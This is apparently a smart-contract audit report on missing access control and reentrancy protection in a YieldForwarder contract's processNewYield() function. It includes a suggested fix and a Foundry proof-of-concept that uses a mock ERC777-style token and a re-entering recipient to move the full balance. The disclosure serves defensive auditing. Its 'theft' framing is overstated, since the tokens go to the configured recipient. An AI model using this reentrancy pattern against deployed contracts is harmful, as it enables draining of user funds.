## Title
Missing Access Control and Reentrancy Protection in YieldForwarder.processNewYield() Enables Unauthorized Yield Distribution and Token Drainage with ERC777-like Tokens

## Summary
The `processNewYield()` function in YieldForwarder.sol lacks both access control and reentrancy protection, despite the contract inheriting `ReentrancyGuard` and the design intent requiring iTryIssuer-only access. If yieldToken is an ERC777 or similar token with transfer hooks, this enables reentrancy attacks to drain accumulated funds and allows any address to trigger yield distribution at arbitrary times.

## Impact
**Severity**: Medium

## Finding Description
**Location:** `src/protocol/YieldForwarder.sol` - `processNewYield()` function [1](#0-0) 

**Intended Logic:** According to the IYieldProcessor interface documentation, `processNewYield()` is "called by the iTryIssuer contract after minting yield tokens" [2](#0-1) , indicating exclusive access should be enforced. The function should safely transfer the exact yield amount with protection against reentrancy.

**Actual Logic:** 
1. The function has no access control modifier - any address can call it [3](#0-2) 
2. The function lacks the `nonReentrant` modifier despite the contract inheriting `ReentrancyGuard` [4](#0-3) 
3. Uses direct `transfer()` instead of SafeERC20's `safeTransfer()` [5](#0-4) 
4. The event is emitted AFTER the external transfer call, violating the Checks-Effects-Interactions (CEI) pattern [6](#0-5) 

For comparison, the `rescueToken()` function correctly implements both `nonReentrant` modifier and uses SafeERC20's `safeTransfer()` [7](#0-6) , showing the contract developers were aware of these protections but chose not to apply them to `processNewYield()`.

**Exploitation Path:**

**Scenario 1: Unauthorized Yield Distribution (No ERC777 required)**
1. An attacker monitors when iTryIssuer mints yield tokens to YieldForwarder
2. Before iTryIssuer can call `processNewYield()`, attacker calls it themselves with any amount ≤ balance
3. Funds are transferred to yieldRecipient at an unauthorized time, potentially disrupting yield distribution timing or accounting

**Scenario 2: Reentrancy Drain with ERC777 Tokens**
1. YieldForwarder accumulates balance from multiple sources (e.g., 1000 tokens from yield, plus 500 from previous incomplete operations)
2. Attacker (or malicious yieldRecipient) calls `processNewYield(500)`
3. During the `transfer()` call at line 102, if yieldToken is ERC777, the recipient's `tokensReceived()` hook is triggered
4. Inside the hook, the recipient re-enters `processNewYield(1000)` 
5. Since there's no `nonReentrant` protection, the second call succeeds
6. The second transfer drains the remaining 1000 tokens before the first call completes
7. Total transferred: 1500 tokens instead of the intended 500

**Scenario 3: State Manipulation During Hook**
1. When `processNewYield()` is called and transfers tokens via ERC777
2. The recipient's hook executes before the `YieldForwarded` event is emitted
3. During the hook, the recipient can:
   - Query contract states that appear inconsistent (transfer in progress)
   - Call other protocol functions while YieldForwarder is mid-execution
   - Front-run or manipulate subsequent operations based on this intermediate state

**Security Property Broken:** 
- Violates the design intent that only iTryIssuer should trigger yield processing
- Violates reentrancy protection best practices (contract inherits ReentrancyGuard but doesn't use it)
- Violates CEI pattern (external call before event emission)

## Impact Explanation
- **Affected Assets**: Any ERC20 tokens held by YieldForwarder, particularly iTRY yield tokens and any accumulated balance
- **Damage Severity**: 
  - **Without ERC777**: Unauthorized actors can trigger yield distribution at arbitrary times, disrupting protocol accounting and yield timing
  - **With ERC777**: Complete drainage of accumulated YieldForwarder balance through reentrancy, potentially stealing yield intended for controlled distribution
- **User Impact**: All protocol participants expecting controlled yield distribution would be affected. If YieldForwarder accumulates significant balance before distribution, all those funds are at risk with ERC777 tokens.

## Likelihood Explanation
- **Attacker Profile**: Any unprivileged address can exploit the missing access control. For reentrancy exploitation, requires either:
  - yieldRecipient to be a contract with ERC777 hook functionality
  - Attacker deploying a malicious ERC777 token (if YieldForwarder is redeployed with different yieldToken)
- **Preconditions**: 
  - YieldForwarder holds token balance (accumulated from yield distributions or other sources)
  - For reentrancy: yieldToken must implement transfer hooks (ERC777 or similar)
- **Execution Complexity**: 
  - Access control bypass: Single transaction, trivial to execute
  - Reentrancy attack: Single transaction with malicious hook logic
- **Frequency**: Can be exploited anytime YieldForwarder holds balance. Reentrancy can drain all accumulated funds in one transaction.

## Recommendation

Add access control and reentrancy protection to `processNewYield()`: [1](#0-0) 

**Recommended fix:**

```solidity
// Add state variable for authorized caller
address public immutable authorizedCaller;

// Update constructor to set authorized caller
constructor(address _yieldToken, address _initialRecipient, address _authorizedCaller) {
    if (_yieldToken == address(0)) revert CommonErrors.ZeroAddress();
    if (_initialRecipient == address(0)) revert CommonErrors.ZeroAddress();
    if (_authorizedCaller == address(0)) revert CommonErrors.ZeroAddress();

    yieldToken = IERC20(_yieldToken);
    yieldRecipient = _initialRecipient;
    authorizedCaller = _authorizedCaller; // Should be iTryIssuer address

    emit YieldRecipientUpdated(address(0), _initialRecipient);
}

// Update processNewYield with protections
function processNewYield(uint256 _newYieldAmount) external override nonReentrant {
    // Add access control
    if (msg.sender != authorizedCaller) revert Unauthorized();
    
    if (_newYieldAmount == 0) revert CommonErrors.ZeroAmount();
    if (yieldRecipient == address(0)) revert RecipientNotSet();

    // Move event before external call (CEI pattern)
    emit YieldForwarded(yieldRecipient, _newYieldAmount);
    
    // Use SafeERC20 for safer token transfers
    yieldToken.safeTransfer(yieldRecipient, _newYieldAmount);
}
```

**Alternative mitigations:**
1. If access control is not desired for flexibility, at minimum add `nonReentrant` modifier and use `safeTransfer()`
2. Implement a pull-pattern where yieldRecipient must claim yield rather than having it pushed
3. Add balance tracking to ensure only the expected amount can be transferred per call

## Proof of Concept

```solidity
// File: test/Exploit_YieldForwarderReentrancy.t.sol
// Run with: forge test --match-test test_YieldForwarderReentrancy -vvv

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/protocol/YieldForwarder.sol";
import "../src/token/iTRY/iTry.sol";

// Malicious ERC777-like token with hooks
contract MaliciousERC777 {
    mapping(address => uint256) public balanceOf;
    YieldForwarder public forwarder;
    MaliciousRecipient public recipient;
    uint256 public transferCount;
    
    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
    
    function setForwarder(address _forwarder) external {
        forwarder = YieldForwarder(_forwarder);
    }
    
    function setRecipient(address _recipient) external {
        recipient = MaliciousRecipient(_recipient);
    }
    
    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        
        transferCount++;
        
        // Trigger hook on recipient (simulating ERC777 tokensReceived)
        if (to == address(recipient) && transferCount == 1) {
            recipient.tokensReceived();
        }
        
        return true;
    }
}

// Malicious recipient that re-enters
contract MaliciousRecipient {
    YieldForwarder public forwarder;
    MaliciousERC777 public token;
    uint256 public reentrancyCount;
    
    function setForwarder(address _forwarder) external {
        forwarder = YieldForwarder(_forwarder);
    }
    
    function setToken(address _token) external {
        token = MaliciousERC777(_token);
    }
    
    function tokensReceived() external {
        // Re-enter on first call only
        if (reentrancyCount == 0) {
            reentrancyCount++;
            // Attempt to drain remaining balance
            uint256 remainingBalance = token.balanceOf(address(forwarder));
            if (remainingBalance > 0) {
                forwarder.processNewYield(remainingBalance);
            }
        }
    }
}

contract Exploit_YieldForwarderReentrancy is Test {
    YieldForwarder public forwarder;
    MaliciousERC777 public token;
    MaliciousRecipient public recipient;
    address public owner;
    
    function setUp() public {
        owner = address(this);
        
        // Deploy malicious token and recipient
        token = new MaliciousERC777();
        recipient = new MaliciousRecipient();
        
        // Deploy YieldForwarder with malicious token
        forwarder = new YieldForwarder(address(token), address(recipient));
        
        // Set references
        token.setForwarder(address(forwarder));
        token.setRecipient(address(recipient));
        recipient.setForwarder(address(forwarder));
        recipient.setToken(address(token));
    }
    
    function test_YieldForwarderReentrancy() public {
        // SETUP: YieldForwarder accumulates 1500 tokens
        token.mint(address(forwarder), 1500e18);
        
        uint256 forwarderBalanceBefore = token.balanceOf(address(forwarder));
        uint256 recipientBalanceBefore = token.balanceOf(address(recipient));
        
        assertEq(forwarderBalanceBefore, 1500e18, "Forwarder should have 1500 tokens");
        assertEq(recipientBalanceBefore, 0, "Recipient should start with 0");
        
        // EXPLOIT: Call processNewYield with 500 tokens
        // Due to missing nonReentrant protection, reentrancy will drain all 1500
        forwarder.processNewYield(500e18);
        
        // VERIFY: All tokens drained instead of just 500
        uint256 forwarderBalanceAfter = token.balanceOf(address(forwarder));
        uint256 recipientBalanceAfter = token.balanceOf(address(recipient));
        
        assertEq(forwarderBalanceAfter, 0, "Vulnerability confirmed: All tokens drained");
        assertEq(recipientBalanceAfter, 1500e18, "Recipient received all 1500 tokens instead of 500");
        assertEq(recipient.reentrancyCount(), 1, "Reentrancy was successful");
    }
    
    function test_UnauthorizedYieldDistribution() public {
        // SETUP: YieldForwarder has tokens
        token.mint(address(forwarder), 1000e18);
        
        // EXPLOIT: Unauthorized user calls processNewYield
        address attacker = address(0x999);
        vm.prank(attacker);
        forwarder.processNewYield(1000e18);
        
        // VERIFY: Attacker successfully triggered unauthorized distribution
        assertEq(token.balanceOf(address(forwarder)), 0, "Tokens transferred");
        assertEq(token.balanceOf(address(recipient)), 1000e18, "Recipient received tokens from unauthorized call");
    }
}
```

## Notes

**Key Observations:**
1. The inconsistency between `rescueToken()` (which has `nonReentrant` and uses `SafeERC20`) and `processNewYield()` (which has neither) suggests this is an oversight rather than intentional design [7](#0-6) 

2. While the current protocol deploys YieldForwarder with iTRY (standard ERC20, not ERC777), the contract is designed to be generic and accepts any `yieldToken` address in the constructor [8](#0-7) , making it vulnerable if deployed with hook-enabled tokens

3. The missing access control alone is a vulnerability even without ERC777, as it allows any address to trigger yield distribution at arbitrary times, contradicting the documented design intent [2](#0-1) 

4. This finding is NOT in the known issues list from the Zellic audit and represents a genuine security gap in the YieldForwarder implementation

**Severity Justification:**
Medium severity is appropriate because:
- **Without ERC777**: Unauthorized yield distribution timing (DOS/griefing)
- **With ERC777**: Complete drainage of accumulated funds (direct theft)
- Exploitable by unprivileged attackers
- Does not require admin compromise
- Affects core yield distribution functionality

### Citations

**File:** src/protocol/YieldForwarder.sol (L27-27)
```text
contract YieldForwarder is IYieldProcessor, Ownable, ReentrancyGuard {
```

**File:** src/protocol/YieldForwarder.sol (L69-77)
```text
    constructor(address _yieldToken, address _initialRecipient) {
        if (_yieldToken == address(0)) revert CommonErrors.ZeroAddress();
        if (_initialRecipient == address(0)) revert CommonErrors.ZeroAddress();

        yieldToken = IERC20(_yieldToken);
        yieldRecipient = _initialRecipient;

        emit YieldRecipientUpdated(address(0), _initialRecipient);
    }
```

**File:** src/protocol/YieldForwarder.sol (L97-107)
```text
    function processNewYield(uint256 _newYieldAmount) external override {
        if (_newYieldAmount == 0) revert CommonErrors.ZeroAmount();
        if (yieldRecipient == address(0)) revert RecipientNotSet();

        // Transfer yield tokens to the recipient
        if (!yieldToken.transfer(yieldRecipient, _newYieldAmount)) {
            revert CommonErrors.TransferFailed();
        }

        emit YieldForwarded(yieldRecipient, _newYieldAmount);
    }
```

**File:** src/protocol/YieldForwarder.sol (L156-166)
```text
    function rescueToken(address token, address to, uint256 amount) external onlyOwner nonReentrant {
        if (to == address(0)) revert CommonErrors.ZeroAddress();
        if (amount == 0) revert CommonErrors.ZeroAmount();

        if (token == address(0)) {
            // Rescue ETH
            (bool success,) = to.call{value: amount}("");
            if (!success) revert CommonErrors.TransferFailed();
        } else {
            // Rescue ERC20 tokens
            IERC20(token).safeTransfer(to, amount);
```

**File:** src/protocol/periphery/IYieldProcessor.sol (L34-35)
```text
     * @dev This function is called by the iTryIssuer contract after minting yield tokens.
     *      The implementing contract should already have received the yield tokens before
```
